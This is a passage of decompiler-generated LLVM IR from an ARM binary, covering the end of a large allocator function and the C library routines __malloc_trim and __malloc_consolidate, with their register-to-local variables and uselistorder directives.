  store i32 12, i32* %r2.global-to-local, align 4
  %v3_bd78 = add i32 %v4_bd70, %v0_bd6c
  %v4_bd78 = inttoptr i32 %v3_bd78 to i32*
  store i32 12, i32* %v4_bd78, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bd80

dec_label_pc_bd80:                                ; preds = %bb151, %bb150, %dec_label_pc_bd44, %dec_label_pc_b98c, %dec_label_pc_bd68
  %v0_bd80 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_bd80, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bd84

dec_label_pc_bd84:                                ; preds = %.thread1, %dec_label_pc_b958, %.thread121, %dec_label_pc_b7c8, %dec_label_pc_b7bc, %dec_label_pc_b624, %dec_label_pc_b5a8, %dec_label_pc_bd80
  store i32 %v2_b4c8, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 48, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r2, align 4
  %v4_bd94 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 48) to i32*), align 4
  store i32 %v4_bd94, i32* @ip, align 4
  store i32 48544, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_bd94)
  br label %dec_label_pc_bda0

dec_label_pc_bda0:                                ; preds = %dec_label_pc_b500, %dec_label_pc_bd84
  %v0_bda0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_bda0, i32* %r0.global-to-local, align 4
  store i32 %v3_b49c, i32* @r4, align 4
  store i32 %v6_b49c, i32* @r5, align 4
  store i32 %v9_b49c, i32* @r6, align 4
  store i32 %v12_b49c, i32* @r7, align 4
  store i32 %v15_b49c, i32* @r8, align 4
  store i32 %v18_b49c, i32* @sb, align 4
  store i32 %v21_b49c, i32* @sl, align 4
  store i32 %v24_b49c, i32* @fp, align 4
  store i32 %v27_b49c, i32* @lr, align 4
  ret i32 %v0_bda0

; uselistorder directives
  uselistorder i32 %v0_bd44, { 1, 0, 2 }
  uselistorder i32 %v3_bd2c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_bd28, { 1, 0 }
  uselistorder i32 %v2_bd0c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_bd04, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_bcbc, { 1, 2, 0 }
  uselistorder i32 %v0_bc84, { 1, 0 }
  uselistorder i32 %v0_bc78, { 1, 0 }
  uselistorder i32 %v2_bc68, { 1, 0 }
  uselistorder i32 %v2_bbf8, { 2, 1, 0 }
  uselistorder i32 %v2_bbe0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_bbd8, { 1, 0, 2 }
  uselistorder i32 %v1_bbd4, { 2, 1, 0 }
  uselistorder i32 %v0_bbd4, { 3, 1, 2, 0 }
  uselistorder i32 %v1_bbb8, { 1, 0 }
  uselistorder i32 %v2_bb90, { 1, 0 }
  uselistorder i32 %v3_bb84, { 1, 0, 2 }
  uselistorder i32 %v2_bb64, { 1, 0, 2 }
  uselistorder i32* %v2_bb5c, { 1, 0, 2 }
  uselistorder i32 %v0_bb44, { 1, 0 }
  uselistorder i32 %v6_bb20, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_bb0c, { 2, 1, 0 }
  uselistorder i32 %v0_baf4, { 1, 0 }
  uselistorder i32 %v2_bab0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_baac, { 1, 0 }
  uselistorder i32 %v3_ba84, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_ba64, { 1, 0, 2 }
  uselistorder i32 %v2_ba4c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b9f4, { 2, 1, 0 }
  uselistorder i32 %v6_b9e8, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_b9c4, { 2, 1, 0, 3 }
  uselistorder i32 %v3_b984, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b944, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_b93c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_b938, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_b924, { 1, 0 }
  uselistorder i32 %v7_b8e4, { 1, 0 }
  uselistorder i32 %v4_b8e4, { 1, 0 }
  uselistorder i32 %v0_b8b4, { 1, 0 }
  uselistorder i32 %v2_b888, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_b88454, { 1, 0 }
  uselistorder i32 %v1_b850, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_b838., { 1, 2, 0 }
  uselistorder i32 %v0_b840, { 0, 1, 3, 2 }
  uselistorder i32 %v1_b840, { 1, 0 }
  uselistorder i32 %v3_b820, { 1, 0 }
  uselistorder i32 %v4_b81c, { 1, 0, 2 }
  uselistorder i32 %v1_b78c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_b7e4, { 1, 0 }
  uselistorder i32 %v1_b7c8, { 1, 0 }
  uselistorder i32 %v1_b668, { 1, 0 }
  uselistorder i32 %v0_b7a8, { 2, 0, 1, 3 }
  uselistorder i32 %v3_b770, { 2, 0, 1, 3 }
  uselistorder i32 %v0_b804.pre, { 1, 2, 0 }
  uselistorder i32 %v0_b74c, { 2, 1, 0 }
  uselistorder i32 %v3_b740, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_b660, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_b708, { 1, 0 }
  uselistorder i32 %v3_b6fc, { 1, 0 }
  uselistorder i32 %v0_b708, { 1, 0 }
  uselistorder i32 %v3_b6e0, { 0, 2, 3, 1 }
  uselistorder i32 %v2_b6d0, { 1, 0, 2 }
  uselistorder i32 %v3_b688, { 2, 1, 0 }
  uselistorder i32 %v0_b678, { 3, 2, 1, 0 }
  uselistorder i32 %v0_b648, { 1, 0 }
  uselistorder i32 %v1_b5fc, { 2, 1, 0, 3 }
  uselistorder i32 %v0_b5f8, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_b59c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_b590, { 1, 0 }
  uselistorder i32 %v3_b560, { 1, 0 }
  uselistorder i32 %v0_b554, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_b534, { 0, 2, 1, 3 }
  uselistorder i1 %v7_b528, { 1, 0 }
  uselistorder i32 %v0_b4f8, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 42, 43, 44, 46, 47, 48, 49, 0, 1, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 91, 78, 79, 80, 81, 82, 84, 85, 86, 87, 2, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 30, 3, 5, 6, 7, 19, 11, 8, 20, 9, 10, 13, 12, 17, 14, 21, 16, 15, 22, 18, 26, 24, 23, 25, 28, 27, 31, 29, 36, 32, 33, 1, 34, 35, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 54, 50, 51, 52, 53, 56, 55, 59, 58, 57, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 22, 23, 34, 33, 41, 24, 42, 25, 26, 27, 28, 29, 30, 31, 32, 35, 36, 37, 38, 39, 40 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_bda0, { 1, 0 }
  uselistorder label %dec_label_pc_bd84, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_bd80, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_bd68, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_bcfc, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_bc78, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_bc70, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_bb44, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_ba78, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_b930, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_b884, { 1, 0 }
  uselistorder label %dec_label_pc_b88c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_b850, { 1, 0 }
  uselistorder label %dec_label_pc_b804, { 1, 0 }
  uselistorder label %dec_label_pc_b798, { 1, 0 }
  uselistorder label %dec_label_pc_b794, { 1, 0 }
  uselistorder label %dec_label_pc_b740, { 1, 0 }
  uselistorder label %dec_label_pc_b72c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b6f4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_b6e0, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_bdb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_bdb4:
  %v0_bdb4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_bdb4, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_bdb4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_bdb4, %bb
  %v10_bdd0 = phi i32 [ %arg1, %dec_label_pc_bdb4 ], [ 0, %bb ]
  ret i32 %v10_bdd0

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_bdd4 = add i32 %arg2, 44
  %v2_bdd4 = inttoptr i32 %v1_bdd4 to i32*
  %v3_bdd4 = load i32, i32* %v2_bdd4, align 4
  %v3_bdd8 = load i32, i32* @r4, align 4
  store i32 %v3_bdd8, i32* %stack_var_-20, align 4
  %v12_bdd8 = load i32, i32* @r7, align 4
  %v1_bddc = add i32 %v3_bdd4, 4
  %v2_bddc = inttoptr i32 %v1_bddc to i32*
  %v3_bddc = load i32, i32* %v2_bddc, align 4
  %v1_bde0 = add i32 %arg2, 860
  %v2_bde0 = inttoptr i32 %v1_bde0 to i32*
  %v3_bde0 = load i32, i32* %v2_bde0, align 4
  store i32 %v3_bde0, i32* @r4, align 4
  %v1_bde4 = and i32 %v3_bddc, -4
  store i32 %v1_bde4, i32* @r6, align 4
  %v1_bde8 = add i32 %v1_bde4, -17
  %v2_bdec = add i32 %v1_bde8, %v3_bde0
  store i32 %arg2, i32* @r5, align 4
  %v2_bdf8 = sub i32 %v2_bdec, %arg1
  store i32 %v3_bde0, i32* %r1.global-to-local, align 4
  %v2_be00 = udiv i32 %v2_bdf8, %v3_bde0
  %v1_be04 = add i32 %v2_be00, -1
  store i32 %v1_be04, i32* %r0.global-to-local, align 4
  %v2_be08 = mul i32 %v1_be04, %v3_bde0
  store i32 %v2_be08, i32* @r7, align 4
  %v2_be0c = icmp eq i32 %v2_be08, 0
  store i1 %v2_be0c, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_be08, 1
  br i1 %tmp8, label %dec_label_pc_be74, label %dec_label_pc_be14

dec_label_pc_be14:                                ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_be18 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_be18, i32* %r0.global-to-local, align 4
  %v0_be1c = load i32, i32* @r5, align 4
  %v1_be1c = add i32 %v0_be1c, 44
  %v2_be1c = inttoptr i32 %v1_be1c to i32*
  %v3_be1c = load i32, i32* %v2_be1c, align 4
  %v0_be20 = load i32, i32* @r6, align 4
  %v2_be20 = add i32 %v0_be20, %v3_be1c
  %v9_be24 = icmp eq i32 %v1_be18, %v2_be20
  store i1 %v9_be24, i1* @cpsr_z, align 1
  store i32 %v1_be18, i32* @r4, align 4
  br i1 %v9_be24, label %dec_label_pc_be30, label %dec_label_pc_be74

dec_label_pc_be30:                                ; preds = %dec_label_pc_be14
  %v0_be30 = load i32, i32* @r7, align 4
  %v1_be30 = sub i32 0, %v0_be30
  store i32 %v1_be30, i32* %r0.global-to-local, align 4
  %v1_be34 = call i32 @__GI_sbrk(i32 %v1_be30)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_be3c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_be3c, i32* %r0.global-to-local, align 4
  %v7_be40 = icmp eq i32 %v1_be3c, -1
  store i1 %v7_be40, i1* @cpsr_z, align 1
  br i1 %v7_be40, label %dec_label_pc_be74, label %dec_label_pc_be48

dec_label_pc_be48:                                ; preds = %dec_label_pc_be30
  %v0_be48 = load i32, i32* @r4, align 4
  %v2_be48 = sub i32 %v0_be48, %v1_be3c
  store i32 %v2_be48, i32* %r0.global-to-local, align 4
  %v9_be48 = icmp eq i32 %v0_be48, %v1_be3c
  store i1 %v9_be48, i1* @cpsr_z, align 1
  br i1 %v9_be48, label %dec_label_pc_be74, label %dec_label_pc_be50

dec_label_pc_be50:                                ; preds = %dec_label_pc_be48
  %v0_be50 = load i32, i32* @r5, align 4
  %v1_be50 = add i32 %v0_be50, 872
  %v2_be50 = inttoptr i32 %v1_be50 to i32*
  %v3_be50 = load i32, i32* %v2_be50, align 4
  %v1_be54 = load i32, i32* @r6, align 4
  %v2_be54 = sub i32 %v1_be54, %v2_be48
  %v1_be58 = add i32 %v0_be50, 44
  %v2_be58 = inttoptr i32 %v1_be58 to i32*
  %v3_be58 = load i32, i32* %v2_be58, align 4
  store i32 %v3_be58, i32* %r1.global-to-local, align 4
  %v2_be5c = sub i32 %v3_be50, %v2_be48
  %v1_be60 = or i32 %v2_be54, 1
  store i32 %v1_be60, i32* @r2, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_be5c, i32* %v2_be50, align 4
  %v0_be6c = load i32, i32* @r2, align 4
  %v1_be6c = load i32, i32* %r1.global-to-local, align 4
  %v2_be6c = add i32 %v1_be6c, 4
  %v3_be6c = inttoptr i32 %v2_be6c to i32*
  store i32 %v0_be6c, i32* %v3_be6c, align 4
  %v1_be80.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_be78

dec_label_pc_be74:                                ; preds = %dec_label_pc_be14, %dec_label_pc_be48, %dec_label_pc_be30, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_be78

dec_label_pc_be78:                                ; preds = %dec_label_pc_be50, %dec_label_pc_be74
  %v1_be80 = phi i32 [ %v1_be80.pre, %dec_label_pc_be50 ], [ 0, %dec_label_pc_be74 ]
  %v2_be7c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_be7c, i32* @r4, align 4
  store i32 %v12_bdd8, i32* @r7, align 4
  ret i32 %v1_be80

; uselistorder directives
  uselistorder i1 %v7_be40, { 1, 0 }
  uselistorder i32 %v1_be3c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_bde0, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_be78, { 1, 0 }
  uselistorder label %dec_label_pc_be74, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_be84 = load i32, i32* @r4, align 4
  store i32 %v3_be84, i32* %stack_var_-36, align 4
  %v0_be88 = load i32, i32* @r0, align 4
  %v1_be88 = inttoptr i32 %v0_be88 to i32*
  %v2_be88 = load i32, i32* %v1_be88, align 4
  store i32 %v2_be88, i32* %r3.global-to-local, align 4
  %v2_be8c = icmp eq i32 %v2_be88, 0
  store i32 %v0_be88, i32* @r4, align 4
  br i1 %v2_be8c, label %dec_label_pc_bfc4.preheader, label %dec_label_pc_bea0

dec_label_pc_bfc4.preheader:                      ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_bfcc25 = add i32 %v0_be88, 52
  store i32 %v1_bfcc25, i32* %r3.global-to-local, align 4
  %v2_bfd426 = add i32 %v0_be88, 60
  %v3_bfd427 = inttoptr i32 %v2_bfd426 to i32*
  store i32 %v1_bfcc25, i32* %v3_bfd427, align 4
  %v0_bfd828 = load i32, i32* %r3.global-to-local, align 4
  %v2_bfd829 = add i32 %v0_bfd828, 12
  %v3_bfd830 = inttoptr i32 %v2_bfd829 to i32*
  store i32 %v0_bfd828, i32* %v3_bfd830, align 4
  br label %dec_label_pc_bfc4.dec_label_pc_bfc4_crit_edge

dec_label_pc_bea0:                                ; preds = %entry
  %v1_bea0 = and i32 %v2_be88, -3
  %v3_bea4 = udiv i32 %v2_be88, 8
  store i32 %v3_bea4, i32* %r2.global-to-local, align 4
  store i32 %v1_bea0, i32* %v1_be88, align 4
  %v0_beac = load i32, i32* @r0, align 4
  %v1_beac = add i32 %v0_beac, -4
  store i32 %v1_beac, i32* %r3.global-to-local, align 4
  %v1_beb0 = load i32, i32* %r2.global-to-local, align 4
  %v4_beb0 = mul i32 %v1_beb0, 4
  %v5_beb0 = add i32 %v4_beb0, %v1_beac
  store i32 %v5_beb0, i32* %sb.global-to-local, align 4
  %v1_beb4 = add i32 %v0_beac, 52
  store i32 %v1_beb4, i32* %r7.global-to-local, align 4
  %v1_beb8 = add i32 %v0_beac, 4
  store i32 %v1_beb8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_bec0

dec_label_pc_bec0:                                ; preds = %dec_label_pc_bfbc, %dec_label_pc_bea0
  %v1_bfb410 = phi i32 [ %v1_bfb4, %dec_label_pc_bfbc ], [ %v5_beb0, %dec_label_pc_bea0 ]
  %v1_becc = phi i32 [ %v1_bfbc, %dec_label_pc_bfbc ], [ %v1_beb8, %dec_label_pc_bea0 ]
  %v1_bec0 = inttoptr i32 %v1_becc to i32*
  %v2_bec0 = load i32, i32* %v1_bec0, align 4
  store i32 %v2_bec0, i32* %r1.global-to-local, align 4
  %v2_bec4 = icmp eq i32 %v2_bec0, 0
  br i1 %v2_bec4, label %dec_label_pc_bfb4, label %dec_label_pc_becc

dec_label_pc_becc:                                ; preds = %dec_label_pc_bec0
  %v0_becc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_becc, i32* %v1_bec0, align 4
  %v0_bed0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bed0

dec_label_pc_bed0:                                ; preds = %dec_label_pc_bfa8, %dec_label_pc_becc
  %v0_beec = phi i32 [ %v0_bfa8, %dec_label_pc_bfa8 ], [ %v0_bed0.pre, %dec_label_pc_becc ]
  %v1_bed0 = add i32 %v0_beec, 4
  %v2_bed0 = inttoptr i32 %v1_bed0 to i32*
  %v3_bed0 = load i32, i32* %v2_bed0, align 4
  store i32 %v3_bed0, i32* %r3.global-to-local, align 4
  %v1_bed4 = and i32 %v3_bed0, -2
  store i32 %v1_bed4, i32* %lr.global-to-local, align 4
  %v2_bed8 = add i32 %v1_bed4, %v0_beec
  store i32 %v2_bed8, i32* @r0, align 4
  %v1_bedc = urem i32 %v3_bed0, 2
  %v2_bedc = icmp eq i32 %v1_bedc, 0
  %v1_bee0 = add i32 %v0_beec, 8
  %v2_bee0 = inttoptr i32 %v1_bee0 to i32*
  %v3_bee0 = load i32, i32* %v2_bee0, align 4
  store i32 %v3_bee0, i32* %sl.global-to-local, align 4
  %v1_bee4 = add i32 %v2_bed8, 4
  %v2_bee4 = inttoptr i32 %v1_bee4 to i32*
  %v3_bee4 = load i32, i32* %v2_bee4, align 4
  store i32 %v3_bee4, i32* %r8.global-to-local, align 4
  br i1 %v2_bedc, label %dec_label_pc_beec, label %dec_label_pc_bf20

dec_label_pc_beec:                                ; preds = %dec_label_pc_bed0
  %v1_beec = inttoptr i32 %v0_beec to i32*
  %v2_beec = load i32, i32* %v1_beec, align 4
  store i32 %v2_beec, i32* %r5.global-to-local, align 4
  %v2_bef0 = sub i32 %v0_beec, %v2_beec
  store i32 %v2_bef0, i32* %r3.global-to-local, align 4
  %v1_bef4 = add i32 %v2_bef0, 8
  %v2_bef4 = inttoptr i32 %v1_bef4 to i32*
  %v3_bef4 = load i32, i32* %v2_bef4, align 4
  store i32 %v3_bef4, i32* %ip.global-to-local, align 4
  %v1_bef8 = add i32 %v3_bef4, 12
  %v2_bef8 = inttoptr i32 %v1_bef8 to i32*
  %v3_bef8 = load i32, i32* %v2_bef8, align 4
  store i32 %v3_bef8, i32* %r1.global-to-local, align 4
  %v9_befc = icmp eq i32 %v3_bef8, %v2_bef0
  %v1_bf00 = add i32 %v2_bef0, 12
  %v2_bf00 = inttoptr i32 %v1_bf00 to i32*
  %v3_bf00 = load i32, i32* %v2_bf00, align 4
  store i32 %v3_bf00, i32* %r2.global-to-local, align 4
  br i1 %v9_befc, label %dec_label_pc_bf08, label %dec_label_pc_bf64

dec_label_pc_bf08:                                ; preds = %dec_label_pc_beec
  %v1_bf08 = add i32 %v3_bf00, 8
  %v2_bf08 = inttoptr i32 %v1_bf08 to i32*
  %v3_bf08 = load i32, i32* %v2_bf08, align 4
  store i32 %v3_bf08, i32* %r3.global-to-local, align 4
  %v9_bf0c = icmp eq i32 %v3_bf08, %v2_bef0
  br i1 %v9_bf0c, label %dec_label_pc_bf14, label %dec_label_pc_bf64

dec_label_pc_bf14:                                ; preds = %dec_label_pc_bf08
  store i32 %v3_bef4, i32* %v2_bf08, align 4
  %v0_bf18 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf18 = load i32, i32* %ip.global-to-local, align 4
  %v2_bf18 = add i32 %v1_bf18, 12
  %v3_bf18 = inttoptr i32 %v2_bf18 to i32*
  store i32 %v0_bf18, i32* %v3_bf18, align 4
  %v0_bf1c = load i32, i32* %lr.global-to-local, align 4
  %v1_bf1c = load i32, i32* %r5.global-to-local, align 4
  %v2_bf1c = add i32 %v1_bf1c, %v0_bf1c
  store i32 %v2_bf1c, i32* %lr.global-to-local, align 4
  %v0_bf24.pre = load i32, i32* @r0, align 4
  %v0_bf28.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_bf20

dec_label_pc_bf20:                                ; preds = %dec_label_pc_bed0, %dec_label_pc_bf14
  %v0_bf98 = phi i32 [ %v1_bed4, %dec_label_pc_bed0 ], [ %v2_bf1c, %dec_label_pc_bf14 ]
  %v0_bf28 = phi i32 [ %v3_bee4, %dec_label_pc_bed0 ], [ %v0_bf28.pre, %dec_label_pc_bf14 ]
  %v1_bf3c = phi i32 [ %v2_bed8, %dec_label_pc_bed0 ], [ %v0_bf24.pre, %dec_label_pc_bf14 ]
  %v0_bf20 = load i32, i32* @r4, align 4
  %v1_bf20 = add i32 %v0_bf20, 44
  %v2_bf20 = inttoptr i32 %v1_bf20 to i32*
  %v3_bf20 = load i32, i32* %v2_bf20, align 4
  store i32 %v3_bf20, i32* %r3.global-to-local, align 4
  %v9_bf24 = icmp eq i32 %v1_bf3c, %v3_bf20
  %v1_bf28 = and i32 %v0_bf28, -4
  store i32 %v1_bf28, i32* %r5.global-to-local, align 4
  br i1 %v9_bf24, label %dec_label_pc_bf98, label %dec_label_pc_bf30

dec_label_pc_bf30:                                ; preds = %dec_label_pc_bf20
  %v2_bf30 = add i32 %v1_bf3c, %v1_bf28
  store i32 %v2_bf30, i32* %r3.global-to-local, align 4
  %v1_bf34 = add i32 %v2_bf30, 4
  %v2_bf34 = inttoptr i32 %v1_bf34 to i32*
  %v3_bf34 = load i32, i32* %v2_bf34, align 4
  store i32 %v3_bf34, i32* %r3.global-to-local, align 4
  %v1_bf38 = urem i32 %v3_bf34, 2
  %v2_bf38 = icmp eq i32 %v1_bf38, 0
  %v2_bf3c = add i32 %v1_bf3c, 4
  %v3_bf3c = inttoptr i32 %v2_bf3c to i32*
  store i32 %v1_bf28, i32* %v3_bf3c, align 4
  br i1 %v2_bf38, label %dec_label_pc_bf44, label %dec_label_pc_bf30.dec_label_pc_bf74_crit_edge

dec_label_pc_bf30.dec_label_pc_bf74_crit_edge:    ; preds = %dec_label_pc_bf30
  %v0_bf78.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_bf74

dec_label_pc_bf44:                                ; preds = %dec_label_pc_bf30
  %v0_bf44 = load i32, i32* @r0, align 4
  %v1_bf44 = add i32 %v0_bf44, 8
  %v2_bf44 = inttoptr i32 %v1_bf44 to i32*
  %v3_bf44 = load i32, i32* %v2_bf44, align 4
  store i32 %v3_bf44, i32* %ip.global-to-local, align 4
  %v1_bf48 = add i32 %v3_bf44, 12
  %v2_bf48 = inttoptr i32 %v1_bf48 to i32*
  %v3_bf48 = load i32, i32* %v2_bf48, align 4
  store i32 %v3_bf48, i32* %r3.global-to-local, align 4
  %v9_bf4c = icmp eq i32 %v3_bf48, %v0_bf44
  %v1_bf50 = add i32 %v0_bf44, 12
  %v2_bf50 = inttoptr i32 %v1_bf50 to i32*
  %v3_bf50 = load i32, i32* %v2_bf50, align 4
  store i32 %v3_bf50, i32* %r2.global-to-local, align 4
  br i1 %v9_bf4c, label %dec_label_pc_bf58, label %dec_label_pc_bf64

dec_label_pc_bf58:                                ; preds = %dec_label_pc_bf44
  %v1_bf58 = add i32 %v3_bf50, 8
  %v2_bf58 = inttoptr i32 %v1_bf58 to i32*
  %v3_bf58 = load i32, i32* %v2_bf58, align 4
  store i32 %v3_bf58, i32* %r3.global-to-local, align 4
  %v9_bf5c = icmp eq i32 %v3_bf58, %v0_bf44
  br i1 %v9_bf5c, label %dec_label_pc_bf68, label %dec_label_pc_bf64

dec_label_pc_bf64:                                ; preds = %dec_label_pc_bf44, %dec_label_pc_bf08, %dec_label_pc_beec, %dec_label_pc_bf58
  %v0_bf64 = call i32 @abort()
  store i32 %v0_bf64, i32* @r0, align 4
  %v0_bf68.pre = load i32, i32* @ip, align 4
  %v1_bf68.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_bf68

dec_label_pc_bf68:                                ; preds = %dec_label_pc_bf58, %dec_label_pc_bf64
  %v1_bf68 = phi i32 [ %v3_bf50, %dec_label_pc_bf58 ], [ %v1_bf68.pre, %dec_label_pc_bf64 ]
  %v0_bf68 = phi i32 [ %v3_bf44, %dec_label_pc_bf58 ], [ %v0_bf68.pre, %dec_label_pc_bf64 ]
  %v2_bf68 = add i32 %v1_bf68, 8
  %v3_bf68 = inttoptr i32 %v2_bf68 to i32*
  store i32 %v0_bf68, i32* %v3_bf68, align 4
  %v0_bf6c = load i32, i32* %r2.global-to-local, align 4
  %v1_bf6c = load i32, i32* %ip.global-to-local, align 4
  %v2_bf6c = add i32 %v1_bf6c, 12
  %v3_bf6c = inttoptr i32 %v2_bf6c to i32*
